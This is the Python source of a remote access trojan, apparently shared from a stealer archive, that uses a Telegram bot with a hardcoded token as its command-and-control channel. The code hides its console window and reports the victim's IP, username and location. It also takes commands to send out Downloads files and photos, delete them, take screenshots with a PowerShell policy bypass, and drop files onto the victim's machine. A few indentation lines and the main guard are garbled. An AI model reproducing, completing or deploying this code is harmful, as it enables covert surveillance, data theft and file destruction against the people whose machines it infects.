# Shared By : lil'tecca 1337🐾, AndraxC2 Archive Stealer
import os
import sys
import socket
import requests
import time
import threading
import subprocess
import shutil
from datetime import datetime
import zipfile
import json

# ========== CONFIG ==========
BOT_TOKEN = "8547280946:AAE9yXsnDUkHBsGPLcWtLtwCT5mmQ4hxSSU"
CHAT_ID = "8004242444"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

# ========== TELEGRAM FUNCTIONS ==========
def bot_send(text):
    """Kirim pesan ke Telegram"""
    try:
        url = f"{TELEGRAM_API}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
        requests.post(url, data=data, timeout=10)
        return True
    except:
        return False

def bot_send_photo(photo_path):
    """Kirim foto ke Telegram"""
    try:
        url = f"{TELEGRAM_API}/sendPhoto"
        with open(photo_path, 'rb') as f:
            files = {'photo': f}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data, timeout=15)
        return True
    except:
        return False

def bot_send_doc(doc_path):
    """Kirim document ke Telegram"""
    try:
        url = f"{TELEGRAM_API}/sendDocument"
        with open(doc_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID}
            requests.post(url, files=files, data=data, timeout=15)
        return True
    except:
        return False

# ========== SYSTEM INFO ==========
def get_system_info():
    """Dapatkan semua info sistem"""
    try:
        # IP Address
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = socket.gethostbyname(socket.gethostname())
    
    # Hostname
    hostname = socket.gethostname()
    
    # Username
    username = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USERNAME', 'Unknown')
    
    # OS Platform
    platform = sys.platform
    
    # Location via IP
    try:
        loc_data = requests.get('https://ipinfo.io/json', timeout=5).json()
        city = loc_data.get('city', 'Unknown')
        region = loc_data.get('region', 'Unknown')
        country = loc_data.get('country', 'Unknown')
        loc = loc_data.get('loc', '0,0')
        maps_link = f"https://maps.google.com/?q={loc}&z=15"
        location = f"{city}, {region}, {country} | {loc}"
    except:
        location = "Unknown"
        maps_link = "https://maps.google.com"
    
    return {
        'ip': ip,
        'hostname': hostname,
        'username': username,
        'platform': platform,
        'location': location,
        'maps_link': maps_link
    }

# ========== STARTUP REPORT ==========
def send_startup_report():
    """Kirim laporan saat RAT pertama kali jalan"""
    info = get_system_info()
    
    report = f"""🚨 <b>KORBAN BARU TERHUBUNG!</b>

<b>🆔 SYSTEM INFO</b>
├ IP: <code>{info['ip']}</code>
├ Hostname: <code>{info['hostname']}</code>
├ Username: <code>{info['username']}</code>
├ OS: <code>{info['platform']}</code>
└ Location: <code>{info['location']}</code>

<b>🗺️ GOOGLE MAPS</b>
<a href="{info['maps_link']}">📍 KLIK UNTUK LIHAT LOKASI</a>

<b>⏰ Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>📋 Commands Available:</b>
/start - Show help
/liatfile - Get all Downloads files
/liatgaleri - Get all photos from Pictures
/hapusfile - Delete Downloads & Pictures
/updatelokasi - Real-time location update
/screenshot - Take screenshot
/kirimfoto [url] - Download photo to victim's gallery"""

    bot_send(report)

# ========== FILE OPERATIONS ==========
def get_downloads_path():
    """Dapatkan path Downloads folder"""
    if sys.platform == "win32":
        return os.path.join(os.environ['USERPROFILE'], 'Downloads')
    elif sys.platform == "darwin":
        return os.path.join(os.path.expanduser('~'), 'Downloads')
    else:
        return os.path.join(os.path.expanduser('~'), 'Downloads')

def get_pictures_path():
    """Dapatkan path Pictures folder"""
    if sys.platform == "win32":
        paths = [
            os.path.join(os.environ['USERPROFILE'], 'Pictures'),
            os.path.join(os.environ['USERPROFILE'], 'OneDrive', 'Pictures')
        ]
    elif sys.platform == "darwin":
        paths = [os.path.join(os.path.expanduser('~'), 'Pictures')]
    else:
        paths = [os.path.join(os.path.expanduser('~'), 'Pictures')]
    
    # Return first existing path
    for path in paths:
        if os.path.exists(path):
            return path
    return None

def cmd_liatfile():
    """AMBIL SEMUA FILE DARI DOWNLOADS"""
    try:
        bot_send("📦 <b>Mengumpulkan file Downloads...</b>")
        
        dl_path = get_downloads_path()
        if not dl_path or not os.path.exists(dl_path):
            bot_send("❌ Folder Downloads tidak ditemukan!")
            return
        
        # List semua file
        all_files = []
        for root, dirs, files in os.walk(dl_path):
            for file in files:
                filepath = os.path.join(root, file)
                # Skip file terlalu besar (>50MB)
                if os.path.getsize(filepath) < 50 * 1024 * 1024:
                    all_files.append(filepath)
        
        if not all_files:
            bot_send("📭 Folder Downloads kosong!")
            return
        
        bot_send(f"📁 Ditemukan {len(all_files)} file. Membuat ZIP...")
        
        # Buat ZIP
        zip_filename = f"downloads_{int(time.time())}.zip"
        with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file in all_files[:50]:  # Max 50 file
                try:
                    arcname = os.path.relpath(file, dl_path)
                    zipf.write(file, arcname)
                except:
                    pass
        
        # Kirim ZIP
        bot_send(f"📤 Mengirim {len(all_files[:50])} file...")
        if bot_send_doc(zip_filename):
            bot_send("✅ Semua file berhasil dikirim!")
        else:
            bot_send("⚠️ Gagal mengirim file, coba lagi")
        
        # Hapus ZIP lokal
        if os.path.exists(zip_filename):
            os.remove(zip_filename)
            
    except Exception as e:
        bot_send(f"❌ Error: {str(e)}")

def cmd_liatgaleri():
    """AMBIL SEMUA FOTO DARI GALERI"""
    try:
        bot_send("📸 <b>Mengumpulkan foto dari Galeri...</b>")
        
        pics_path = get_pictures_path()
        if not pics_path or not os.path.exists(pics_path):
            bot_send("❌ Folder Pictures tidak ditemukan!")
            return
        
        # Cari semua gambar
        image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
        all_images = []
        
        for root, dirs, files in os.walk(pics_path):
            for file in files:
                if any(file.lower().endswith(ext) for ext in image_extensions):
                    img_path = os.path.join(root, file)
                    # Skip gambar terlalu besar (>10MB)
                    if os.path.getsize(img_path) < 10 * 1024 * 1024:
                        all_images.append(img_path)
        
        if not all_images:
            bot_send("🖼️ Tidak ada gambar di Galeri")
            return
        
        bot_send(f"📷 Ditemukan {len(all_images)} gambar. Mengirim...")
        
        # Kirim 15 gambar pertama
        sent_count = 0
        for img in all_images[:15]:
            try:
                if bot_send_photo(img):
                    sent_count += 1
                    time.sleep(1)  # Delay agar tidak flood
            except:
                pass
        
        bot_send(f"✅ Berhasil mengirim {sent_count} gambar")
        
        # Jika masih banyak gambar, buat ZIP
        remaining = all_images[15:30]  # Ambil 15 berikutnya

if remaining:
            bot_send("📦 Membuat ZIP untuk gambar lainnya...")
            zip_filename = f"gallery_{int(time.time())}.zip"
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for img in remaining:
                    try:
                        arcname = os.path.basename(img)
                        zipf.write(img, arcname)
                    except:
                        pass
            
            bot_send_doc(zip_filename)
            if os.path.exists(zip_filename):
                os.remove(zip_filename)
                
    except Exception as e:
        bot_send(f"❌ Error: {str(e)}")

def cmd_hapusfile():
    """HAPUS SEMUA FILE DOWNLOADS DAN GALERI"""
    try:
        bot_send("🗑️ <b>Menghapus file...</b>")
        
        deleted_files = 0
        deleted_images = 0
        
        # Hapus Downloads
        dl_path = get_downloads_path()
        if dl_path and os.path.exists(dl_path):
            for item in os.listdir(dl_path):
                try:
                    item_path = os.path.join(dl_path, item)
                    if os.path.isfile(item_path):
                        os.remove(item_path)
                        deleted_files += 1
                    elif os.path.isdir(item_path):
                        shutil.rmtree(item_path)
                        deleted_files += 1
                except:
                    pass
        
        # Hapus Pictures
        pics_path = get_pictures_path()
        if pics_path and os.path.exists(pics_path):
            for root, dirs, files in os.walk(pics_path):
                for file in files:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp')):
                        try:
                            os.remove(os.path.join(root, file))
                            deleted_images += 1
                        except:
                            pass
        
        bot_send(f"✅ <b>Penghapusan selesai!</b>\n├ File terhapus: {deleted_files}\n└ Gambar terhapus: {deleted_images}")
        
    except Exception as e:
        bot_send(f"❌ Error: {str(e)}")

def cmd_kirimfoto(url):
    """DOWNLOAD FOTO DARI URL KE GALERI KORBAN"""
    try:
        bot_send(f"📥 <b>Mendownload foto dari URL...</b>")
        
        # Download foto
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(url, headers=headers, timeout=15)
        
        if response.status_code == 200:
            # Simpan ke Pictures folder
            pics_path = get_pictures_path()
            if not pics_path:
                pics_path = get_downloads_path()
            
            if not os.path.exists(pics_path):
                os.makedirs(pics_path, exist_ok=True)
            
            # Generate filename
            filename = f"downloaded_{int(time.time())}.jpg"
            filepath = os.path.join(pics_path, filename)
            
            # Save file
            with open(filepath, 'wb') as f:
                f.write(response.content)
            
            bot_send(f"✅ <b>Foto berhasil disimpan!</b>\n└ Lokasi: <code>{filepath}</code>")
            
            # Kirim preview
            bot_send_photo(filepath)
            
        else:
            bot_send("❌ Gagal download foto")
            
    except Exception as e:
        bot_send(f"❌ Error: {str(e)}")

def cmd_updatelokasi():
    """UPDATE LOKASI REAL-TIME"""
    for i in range(3):
        try:
            info = get_system_info()
            
            report = f"""📍 <b>LOKASI UPDATE ({i+1}/3)</b>

<b>🌍 Informasi Lokasi</b>
├ IP: <code>{info['ip']}</code>
├ Lokasi: <code>{info['location']}</code>
├ Waktu: {datetime.now().strftime('%H:%M:%S')}
└ Hostname: <code>{info['hostname']}</code>

<b>🗺️ Google Maps</b>
<a href="{info['maps_link']}">👉 BUKA PETA REAL-TIME</a>"""
            
            bot_send(report)
            time.sleep(10)  # Delay 10 detik
            
        except Exception as e:
            bot_send(f"❌ Error update lokasi: {str(e)}")
            break

def cmd_screenshot():
    """AMBIL SCREENSHOT"""
    try:
        bot_send("📸 <b>Mengambil screenshot...</b>")
        
        screenshot_path = f"screenshot_{int(time.time())}.png"
        
        if sys.platform == "win32":
            # Windows: gunakan PowerShell
            ps_script = f"""
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
            $bitmap.Save("{screenshot_path}", [System.Drawing.Imaging.ImageFormat]::Png)
            """
            
            with open("screenshot.ps1", "w") as f:
                f.write(ps_script)
            
            subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", "screenshot.ps1"], 
                         capture_output=True, shell=True)
            
            os.remove("screenshot.ps1")
            
        elif sys.platform == "darwin":
            # macOS
            subprocess.run(["screencapture", "-x", screenshot_path])
            
        else:
            # Linux
            subprocess.run(["import", "-window", "root", screenshot_path])
        
        # Kirim screenshot
        if os.path.exists(screenshot_path) and os.path.getsize(screenshot_path) > 0:
            bot_send_photo(screenshot_path)
            bot_send("✅ Screenshot berhasil diambil!")
            os.remove(screenshot_path)
        else:
            bot_send("❌ Gagal mengambil screenshot")
            
    except Exception as e:
        bot_send(f"❌ Error screenshot: {str(e)}")

# ========== TELEGRAM POLLER ==========
def telegram_poller():
    """Polling untuk menerima command dari Telegram"""
    last_update_id = 0
    
    while True:
        try:
            # Get updates
            url = f"{TELEGRAM_API}/getUpdates"
            params = {
                'offset': last_update_id + 1,
                'timeout': 20,
                'allowed_updates': ['message']
            }
            
            response = requests.get(url, params=params, timeout=25)
            
            if response.status_code == 200:
                data = response.json()
                
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        last_update_id = update['update_id']
                        
                        if 'message' in update and 'text' in update['message']:
                            chat_id = str(update['message']['chat']['id'])
                            text = update['message']['text'].strip()
                            
                            # Cek apakah chat_id benar
                            if chat_id == CHAT_ID:
                                # Handle commands
                                if text == '/start' or text == '/help':
                                    help_text = """🤖 <b>CYBER indonet RAT v3.0</b>

<b>📁 FILE OPERATIONS</b>
/liatfile - Ambil SEMUA file Downloads (ZIP)
/liatgaleri - Ambil SEMUA foto dari Galeri
/hapusfile - HAPUS semua file Downloads & Galeri

<b>📍 LOCATION</b>
/updatelokasi - Update lokasi + Google Maps link

<b>📸 SCREENSHOT</b>
/screenshot - Ambil screenshot

<b>📥 DOWNLOAD</b>
/kirimfoto [url] - Download foto ke Galeri korban

<b>⚡ Contoh:</b>
/kirimfoto https://example.com/photo.jpg"""
                                    bot_send(help_text)
                                    
                                elif text == '/liatfile':
                                    threading.Thread(target=cmd_liatfile).start()

elif text == '/liatgaleri':
                                    threading.Thread(target=cmd_liatgaleri).start()
                                    
                                elif text == '/hapusfile':
                                    threading.Thread(target=cmd_hapusfile).start()
                                    
                                elif text == '/updatelokasi':
                                    threading.Thread(target=cmd_updatelokasi).start()
                                    
                                elif text == '/screenshot':
                                    threading.Thread(target=cmd_screenshot).start()
                                    
                                elif text.startswith('/kirimfoto '):
                                    url = text.split(' ', 1)[1]
                                    threading.Thread(target=cmd_kirimfoto, args=(url,)).start()
                                    
                                elif text:
                                    bot_send("❌ Command tidak dikenal. Ketik /help untuk bantuan")
            
            time.sleep(3)
            
        except:
            time.sleep(5)

# ========== MAIN ==========
def main():
    """Main function"""
    # Hide console window (Windows only)
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    # Install requests jika belum ada
    try:
        import requests
    except:
        bot_send("⚠️ Installing dependencies...")
        if sys.platform == "win32":
            os.system("python -m pip install requests --quiet")
        else:
            os.system("pip3 install requests --quiet")
        time.sleep(2)
    
    # Kirim startup report
    send_startup_report()
    
    # Start Telegram poller
    poller_thread = threading.Thread(target=telegram_poller, daemon=True)
    poller_thread.start()
    
    # Keep program running
    while True:
        time.sleep(3600)

if name == "main":
    main()
